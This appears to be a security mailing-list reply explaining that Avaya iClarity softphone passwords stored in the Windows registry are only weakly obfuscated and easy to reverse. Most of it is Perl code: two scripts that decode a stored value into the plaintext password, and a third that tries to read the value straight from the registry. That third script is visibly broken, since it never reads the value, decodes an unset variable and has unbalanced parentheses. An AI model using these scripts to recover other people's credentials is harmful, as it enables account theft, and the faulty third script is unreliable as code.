You suspect correctly.

Our values were found in a different registry location but i'm willing to bet
the obfuscation is the same. One method of attack is to simply place the stored 
password in your own registry and hit connect. It's only there because people
are lazy and just want their phones to work. It's easily reversable:

 ----- 8< --- [ snippy snippy bad code ] --- >8 ----

#!/usr/bin/perl
$avayapw=shift;

my $pwlength = ord(substr($avayapw, 0, 1)) - 33;
my $startpoint = ($pwlength * 7) % 55;

print "Password length: $pwlength\n";
print " Start position: $startpoint\n";

print "\nYour password is: " . substr($avayapw, $startpoint, 1);
my $byte = $startpoint;
for ( my $a = 1; $a<$pwlength; $a++) {
  $nextbyte = $byte - 7;
  if ($nextbyte < 0) {
    $nextbyte = 55 - (7 - $byte);
  }
  $byte = $nextbyte;
  print substr($avayapw, $byte, 1);
}

 ----- 8< --- [ snippy snippy bad code ] --- >8 ----

Shorter:

#!/usr/bin/perl
$a=shift;
$l=ord(substr($a,0,1))-33;
for $c ( 1 .. $l ) {
  print substr($a, (((($l-$c)+1)*7)%55), 1);
}

 ----- 8< --- [ snippy snippy bad code ] --- >8 ----

And something more fun:

#!/usr/bin/perl

use Win32::Registry;

$::HKEY_CURRENT_USER->Open("Software\\Avaya\\iClarity\\Options", $hKey) or die "Can't open: $^E\n";
$l=ord(substr($value,0,1))-33;
for $c ( 1 .. $l ) {
  print substr($a, (((($l-$c)+1)*7%55), 1);
}
